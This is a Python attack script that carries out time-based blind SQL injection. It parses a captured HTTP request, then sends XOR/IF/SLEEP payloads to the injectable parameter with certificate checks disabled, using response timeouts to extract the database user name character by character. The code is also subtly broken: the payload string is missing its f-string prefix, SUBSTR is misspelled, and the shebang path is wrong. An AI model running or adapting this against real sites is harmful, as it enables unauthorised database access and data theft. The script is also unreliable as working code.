#!/usr/env python3
import requests
import sys
import string

if len(sys.argv) == 2:
	headers = []	 
	port=443
	payload = ''
	r = False
	with open(sys.argv[1] , 'r') as file:
		url = file.readline().split()[1]
		while (True):
			a = file.readline()
			if 'Host' in a:
				url = a.split(':')[1][:-1] + url
			else:
				headers.append(a)
			if a == '':
				break
			if r :
				payload = a.split('=')[0][1:]
			if a =='\n': r = True
url = 'https://' + url[1:]+'/'
print('Url:'+ url)

# print('headers' , headers) 
sample = string.ascii_letters + string.digits
seq = ''
while(True):
	ta = seq
	for  i in sample: 
		try:
			test = requests.post(url,verify=False , data = {payload : "0'XOR(if(subtr(user(),{len(seq)+1},1)='{i}'%2Csleep(10)%2C0))XOR'A" } ,timeout= 5 )
			print(seq+ ' : '+i )
		except:
			seq+=i
			break
	if ta == seq:
		break
# r = requests.get('https://api.github.com/events')
# ress = requests.post(url=url , data=payload)

print(seq)